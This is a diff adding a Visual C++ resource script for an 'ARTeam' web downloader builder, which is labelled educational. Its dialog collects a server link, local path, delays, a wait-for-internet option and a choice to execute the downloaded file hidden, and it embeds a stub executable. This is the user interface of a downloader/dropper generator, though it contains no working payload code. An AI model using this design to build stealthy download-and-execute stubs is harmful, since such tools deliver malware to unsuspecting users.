@@ -1,0 +1,163 @@
+//Microsoft Developer Studio generated resource script.
+//
+#include "resource.h"
+
+#define APSTUDIO_READONLY_SYMBOLS
+/////////////////////////////////////////////////////////////////////////////
+//
+// Generated from the TEXTINCLUDE 2 resource.
+//
+#include "afxres.h"
+
+/////////////////////////////////////////////////////////////////////////////
+#undef APSTUDIO_READONLY_SYMBOLS
+
+/////////////////////////////////////////////////////////////////////////////
+// English (U.S.) resources
+
+#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_ENU)
+#ifdef _WIN32
+LANGUAGE LANG_ENGLISH, SUBLANG_ENGLISH_US
+#pragma code_page(1252)
+#endif //_WIN32
+
+#ifdef APSTUDIO_INVOKED
+/////////////////////////////////////////////////////////////////////////////
+//
+// TEXTINCLUDE
+//
+
+1 TEXTINCLUDE DISCARDABLE 
+BEGIN
+    "resource.h\0"
+END
+
+2 TEXTINCLUDE DISCARDABLE 
+BEGIN
+    "#include ""afxres.h""\r\n"
+    "\0"
+END
+
+3 TEXTINCLUDE DISCARDABLE 
+BEGIN
+    "\r\n"
+    "\0"
+END
+
+#endif    // APSTUDIO_INVOKED
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// Dialog
+//
+
+IDD_MAIN DIALOG DISCARDABLE  0, 0, 288, 157
+STYLE DS_MODALFRAME | DS_CENTER | WS_MINIMIZEBOX | WS_POPUP | WS_CAPTION | 
+    WS_SYSMENU
+CAPTION "Web Downloader for ARTeam"
+FONT 7, "Microsoft Sans Serif"
+BEGIN
+    EDITTEXT        IDC_SERVERPATH,63,19,154,14,ES_AUTOHSCROLL
+    EDITTEXT        IDC_FILENAME,63,35,154,14,ES_AUTOHSCROLL
+    COMBOBOX        IDC_DIR,63,51,154,60,CBS_DROPDOWN | CBS_SORT | 
+                    WS_VSCROLL | WS_TABSTOP
+    CONTROL         "Insert a delay before starting to download (msecs) : ",
+                    IDC_DOWNLOADDELAY,"Button",BS_AUTOCHECKBOX | WS_TABSTOP,
+                    13,83,159,10
+    CONTROL         "Insert a delay before starting downloaded file. (msecs) : ",
+                    IDC_STARTUPDELAY,"Button",BS_AUTOCHECKBOX | WS_TABSTOP,
+                    13,101,165,10
+    CONTROL         "Check if it's connected to internet. If not, wait until it is and download. ",
+                    IDC_CHECKINTERNET,"Button",BS_AUTOCHECKBOX | WS_TABSTOP,
+                    13,119,204,10
+    DEFPUSHBUTTON   "Build",IDC_BUILD,231,11,50,14,BS_FLAT
+    PUSHBUTTON      "About",IDC_ABOUT,231,31,50,14,BS_FLAT
+    PUSHBUTTON      "Exit",IDC_EXIT,231,51,50,14,BS_FLAT
+    LTEXT           "[ Gunther ]",IDC_STATIC,231,71,30,8,WS_DISABLED
+    GROUPBOX        "Build Information",IDC_STATIC,7,7,218,143
+    LTEXT           "Server Link : ",IDC_STATIC,13,19,38,8
+    EDITTEXT        IDC_DOWNLOADTIME,189,83,28,14,ES_AUTOHSCROLL | ES_NUMBER | 
+                    WS_DISABLED
+    EDITTEXT        IDC_DELAYTIME,189,101,28,14,ES_AUTOHSCROLL | ES_NUMBER | 
+                    WS_DISABLED
+    LTEXT           "Local Filename : ",IDC_STATIC,13,35,46,8
+    EDITTEXT        IDC_CUSTOM,63,67,154,14,ES_AUTOHSCROLL | WS_DISABLED
+    LTEXT           "Custom Dir. : ",IDC_STATIC,13,67,38,8
+    LTEXT           "Local Directory : ",IDC_STATIC,13,51,46,8
+    CONTROL         "ShowNormal",IDC_EXE1,"Button",BS_AUTORADIOBUTTON | 
+                    WS_DISABLED,72,136,51,10
+    CONTROL         "ShowHidden",IDC_EXE2,"Button",BS_AUTORADIOBUTTON | 
+                    WS_DISABLED,131,136,51,10
+    CONTROL         "Excute Exe :",IDC_EXECUTE,"Button",BS_AUTOCHECKBOX | 
+                    WS_TABSTOP,13,136,51,10
+END
+
+IDD_ABOUT DIALOG DISCARDABLE  0, 0, 160, 90
+STYLE DS_MODALFRAME | DS_CENTER | WS_POPUP | WS_CAPTION | WS_SYSMENU
+CAPTION "About ARTeam WebDownloader"
+FONT 7, "Microsoft Sans Serif"
+BEGIN
+    DEFPUSHBUTTON   "Exit",IDC_EXITABOUT,47,64,50,14,BS_FLAT
+    CTEXT           "This is a specially made Web Downloader for ARTeam.  It's meant for Educational purposes.",
+                    IDC_STATIC,19,10,121,42
+END
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// DESIGNINFO
+//
+
+#ifdef APSTUDIO_INVOKED
+GUIDELINES DESIGNINFO DISCARDABLE 
+BEGIN
+    IDD_MAIN, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 281
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 150
+    END
+
+    IDD_ABOUT, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 153
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 83
+    END
+END
+#endif    // APSTUDIO_INVOKED
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// Icon
+//
+
+// Icon with lowest ID value placed first to ensure application icon
+// remains consistent on all systems.
+IDI_ICON                ICON    DISCARDABLE     "arteam.ico"
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// RT_EXE
+//
+
+IDR_RT_EXE              RT_EXE  DISCARDABLE     "ARTeam Stub\\Release\\ARTeam Stub.exe"
+#endif    // English (U.S.) resources
+/////////////////////////////////////////////////////////////////////////////
+
+
+
+#ifndef APSTUDIO_INVOKED
+/////////////////////////////////////////////////////////////////////////////
+//
+// Generated from the TEXTINCLUDE 3 resource.
+//
+
+
+/////////////////////////////////////////////////////////////////////////////
+#endif    // not APSTUDIO_INVOKED
+
